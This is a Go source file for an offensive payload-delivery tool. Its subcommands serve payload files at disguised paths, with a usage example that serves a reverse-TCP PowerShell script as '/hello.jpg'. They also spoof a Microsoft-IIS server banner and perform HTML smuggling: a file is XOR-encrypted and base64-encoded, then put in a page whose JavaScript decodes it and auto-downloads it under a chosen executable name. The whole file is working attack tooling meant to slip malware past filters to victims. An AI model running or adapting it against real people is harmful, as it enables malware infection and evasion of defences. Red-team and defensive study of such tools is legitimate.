package main

import (
	"crypto/rand"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"mime"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)

var (
	bind         string
	certFile     string
	keyFile      string
	only200      bool
	customServer string
)

type statusRecorder struct {
	http.ResponseWriter
	status int
}

func (rec *statusRecorder) WriteHeader(code int) {
	rec.status = code
	rec.ResponseWriter.WriteHeader(code)
}

func main() {
	flag.StringVar(&bind, "bind", "0.0.0.0:8000", "Bind address.")
	flag.StringVar(&certFile, "cert", "", "Path to SSL certificate file. If provided, enables HTTPS.")
	flag.StringVar(&keyFile, "key", "", "Path to SSL key file. If provided, enables HTTPS.")
	flag.BoolVar(&only200, "200", false, "Log only 200 responses.")
	flag.StringVar(&customServer, "banner", "Microsoft-IIS/10.0", "Custom Server header to include in responses for banner grabbing.")
	showHelp := flag.Bool("help", false, "Show help for all commands.")
	showHelpShort := flag.Bool("h", false, "Show help for all commands.")

	deliverCmd := flag.NewFlagSet("deliver", flag.ExitOnError)
	smuggleCmd := flag.NewFlagSet("smuggle", flag.ExitOnError)
	fileServerCmd := flag.NewFlagSet("server", flag.ExitOnError)

	deliverFile := deliverCmd.String("file", "", "File to deliver. (required)")
	deliverPaths := deliverCmd.String("path", "/", "Comma-separated paths to deliver payload. (example: '/static/main.js,/delivery/payload')")

	smuggleFile := smuggleCmd.String("file", "", "File to smuggle. (required)")
	smugglePaths := smuggleCmd.String("path", "/", "Comma-separated paths to deliver payload. (example: '/download/older.html,/download/newer.html')")
	smuggleName := smuggleCmd.String("name", "", "Name of the file for download. (example: download.exe) (required)")
	smuggleKey := smuggleCmd.Int("key", 32, "Random byte key length of XOR for the smuggled file. (required)")

	fileServerDir := fileServerCmd.String("dir", ".", "Directory to serve files. (default: current directory)")

	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "Usage of %s:\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "\nSubcommands:\n")
		fmt.Fprintf(os.Stderr, "  deliver   - Deliver a file to specified paths\n")
		fmt.Fprintf(os.Stderr, "  smuggle  - Smuggle a file inside HTML\n")
		fmt.Fprintf(os.Stderr, "  server   - Start a file server\n")
		fmt.Fprintf(os.Stderr, "\nGlobal Options:\n")
		flag.PrintDefaults()
		fmt.Fprintf(os.Stderr, "\nSubcommand 'deliver' options:\n")
		deliverCmd.PrintDefaults()
		fmt.Fprintf(os.Stderr, "\nSubcommand 'smuggle' options:\n")
		smuggleCmd.PrintDefaults()
		fmt.Fprintf(os.Stderr, "\nSubcommand 'server' options:\n")
		fileServerCmd.PrintDefaults()
		fmt.Fprintf(os.Stderr, "\nExamples:\n")
		fmt.Fprintf(os.Stderr, "  %s deliver -file=/home/kali/payloads/revtcp.ps1 -path=/hello.jpg\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "  %s smuggle -file=file.exe -name=totallynotavirus.exe -path=/download\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "  %s server -dir=/home/kali/payloads -bind=0.0.0.0:8080\n", os.Args[0])
	}

	if len(os.Args) < 2 || *showHelp || *showHelpShort {
		flag.Usage()
		os.Exit(1)
	}

	switch os.Args[1] {
	case "deliver":
		deliverCmd.Parse(os.Args[2:])
		if *deliverFile == "" {
			fmt.Println("Error: The parameter -file is required for 'deliver'.")
			os.Exit(1)
		}
		runDeliver(*deliverFile, *deliverPaths)
	case "smuggle":
		smuggleCmd.Parse(os.Args[2:])
		if *smuggleFile == "" || *smuggleName == "" {
			fmt.Println("Error: The parameters -file and -name are required for 'smuggle'.")
			os.Exit(1)
		}
		runSmuggle(*smuggleFile, *smuggleName, *smugglePaths, *smuggleKey)
	case "server":
		fileServerCmd.Parse(os.Args[2:])
		runFileServer(*fileServerDir)
	default:
		fmt.Println("Error: Unknown subcommand. Use 'deliver', 'smuggle', or 'server'.")
		flag.Usage()
		os.Exit(1)
	}
}

func runDeliver(filename string, paths string) {
	content, err := os.ReadFile(filename)
	if err != nil {
		fmt.Println("Error reading file:", err)
		return
	}

	fmt.Printf("[+] Serving raw file data: %s\n", filename)
	pathsList := strings.Split(paths, ",")
	for _, p := range pathsList {
		p = strings.TrimSpace(p)
		http.HandleFunc(p, logRequests(func(w http.ResponseWriter, r *http.Request) {
			if r.URL.Path != p {
				http.NotFound(w, r)
				return
			}
			if customServer != "" {
				w.Header().Set("Server", customServer)
			}
			w.Header().Set("Content-Type", getMimeType(filename))
			w.Write(content)
		}))
	}

	startServer()
}

func runSmuggle(filename, name, paths string, smuggleKey int) {
	xorKey := make([]byte, smuggleKey)
	_, err := rand.Read(xorKey)
	if err != nil {
		fmt.Println("Error generating XOR key:", err)
		return
	}
	encodedKey := base64.StdEncoding.EncodeToString(xorKey)

	encoded, err := encodeFileBase64XOR(filename, xorKey)
	if err != nil {
		fmt.Println("Error encoding file:", err)
		return
	}

	content := htmlSmugglingContent(encoded, name, encodedKey)

	fmt.Printf("[+] Serving smuggled HTML for file: %s\n", filename)
	pathsList := strings.Split(paths, ",")
	for _, p := range pathsList {
		p = strings.TrimSpace(p)
		http.HandleFunc(p, logRequests(func(w http.ResponseWriter, r *http.Request) {
			if r.URL.Path != p {
				http.NotFound(w, r)
				return
			}
			if customServer != "" {
				w.Header().Set("Server", customServer)
			}
			w.Header().Set("Content-Type", "text/html")
			fmt.Fprint(w, content)
		}))
	}

	startServer()
}

func runFileServer(dir string) {
	fmt.Printf("[+] Serving directory: %s\n", dir)
	http.Handle("/", logRequests(func(w http.ResponseWriter, r *http.Request) {
		if customServer != "" {
			w.Header().Set("Server", customServer)
		}
		http.FileServer(http.Dir(dir)).ServeHTTP(w, r)
	}))
	startServer()
}

func startServer() {
	if bind == "" {
		fmt.Println("Error: The parameter -bind is required.")
		os.Exit(1)
	}

	fmt.Printf("[+] Server listening on http%s://%s\n", getProtocol(), bind)
	var err error
	if certFile != "" && keyFile != "" {
		err = http.ListenAndServeTLS(bind, certFile, keyFile, nil)
	} else {
		err = http.ListenAndServe(bind, nil)
	}
	if err != nil {
		fmt.Println("Error starting server:", err)
	}
}

func encodeFileBase64XOR(filename string, key []byte) (string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return "", err
	}
	defer file.Close()

	fileBytes, err := io.ReadAll(file)
	if err != nil {
		return "", err
	}

	for i := range fileBytes {
		fileBytes[i] ^= key[i%len(key)]
	}

	return base64.StdEncoding.EncodeToString(fileBytes), nil
}

func htmlSmugglingContent(encoded, name, encodedKey string) string {
	return fmt.Sprintf(`<html>
    <body>
        <script>
        function a(i) {
            return Uint8Array.from(atob(i), c => c.charCodeAt(0));
        }
        function b(d, k) {
            let out = new Uint8Array(d.length);
            for (let i = 0; i < d.length; i++) {
                out[i] = d[i] ^ k[i %% k.length];
            }
            return out;
        }

        const f = "%s";
        const g = "%s";
        const d = a(f);
        const e = a(g);
        const h = b(d, e);

        var blob = new Blob([h], { type: 'octet/stream' });
        var name = "%s";

        if (window.navigator.msSaveOrOpenBlob) {
            window.navigator.msSaveOrOpenBlob(blob, name);
        } else {
            var a = document.createElement('a');
            document.body.appendChild(a);
            a.style = 'display: none';
            var url = window.URL.createObjectURL(blob);
            a.href = url;
            a.download = name;
            a.click();
            window.URL.revokeObjectURL(url);
        }
        </script>
    </body>
</html>`, encoded, encodedKey, name)
}

func getMimeType(name string) string {
	extension := filepath.Ext(name)
	mimeType := mime.TypeByExtension(extension)

	if extension == ".exe" {
		mimeType = "application/x-dosexec; charset=binary"
	}

	if mimeType == "" {
		mimeType = "application/octet-stream"
	}

	return mimeType
}

func getProtocol() string {
	if certFile != "" && keyFile != "" {
		return "s"
	}
	return ""
}

func logRequests(handler http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		recorder := &statusRecorder{ResponseWriter: w, status: http.StatusOK}
		handler(recorder, r)

		if !only200 || recorder.status == http.StatusOK {
			fmt.Printf("+ Time: %s | Method: %s | IP: %s | Status: %d | Host: http%s://%s:%s \n",
				time.Now().Format(time.RFC3339), r.Method, r.RemoteAddr, recorder.status, getProtocol(), r.Host, strings.Split(bind, ":")[1])
		}
	}
}
